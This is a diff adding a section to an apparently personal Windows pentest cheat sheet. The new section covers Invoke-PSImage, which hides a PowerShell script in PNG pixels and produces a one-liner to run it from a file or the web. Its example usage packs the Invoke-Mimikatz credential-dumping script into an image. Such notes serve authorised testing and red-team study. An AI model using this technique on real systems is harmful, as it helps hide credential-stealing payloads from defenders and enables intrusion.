@@ -66,6 +66,7 @@ A place for me to store my notes/tricks for Windows Based Systems.
       * <a href="#-weirdhta---undetectable-hta">WeirdHTA - Undetectable HTA</a>
       * <a href="#-evilwinrm">EvilWinRM</a>
       * <a href="#-GetVulnerableGPO">GetVulnerableGPO</a>
+      * <a href="#-invoke--psimage">Invoke-PSImage</a>
    * <a href="#privilege-escalation">Privilege Escalation</a>
       * <a href="#-basics-1">Basics</a>
       * <a href="#-powerupps1-sometimes-a-quick-win">PowerUp.ps1 (Sometimes a Quick Win)</a>
@@ -1005,6 +1006,28 @@ Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p P
 #https://github.com/gpoguy/GetVulnerableGPO
 
 PowerShell script to find 'vulnerable' security-related GPOs that should be hardened (for more background, see the GPO discoverability section of this blog: https://sdmsoftware.com/group-policy-blog/security-related/security-fun-bloodhound-ms16-072-gpo-discoverability/) Requires GPMC & SDM Software GPMC PowerShell Module (used to more easily parse GP settings during the search): https://s3.amazonaws.com/sdmsoftware.com/dl/SDM-GPMC-Module2.0Setup.zip
+
+```
+
+
+
+#### [](#header-4) Invoke-PSImage
+
+```powershell
+#https://github.com/peewpw/Invoke-PSImage
+
+Encodes a PowerShell script in the pixels of a PNG file and generates a oneliner to execute
+
+Invoke-PSImage takes a PowerShell script and encodes the bytes of the script into the pixels of a PNG image. It generates a oneliner for executing either from a file of from the web.
+
+PS>Import-Module .\Invoke-PSImage.ps1
+PS>Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\evil-kiwi.png -Image .\kiwi.jpg
+   [Oneliner to execute from a file]
+   
+   
+PS>Import-Module .\Invoke-PSImage.ps1
+PS>Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\evil-kiwi.png -Image .\kiwi.jpg -WebRequest
+   [Oneliner to execute from the web]
 
 ```
 
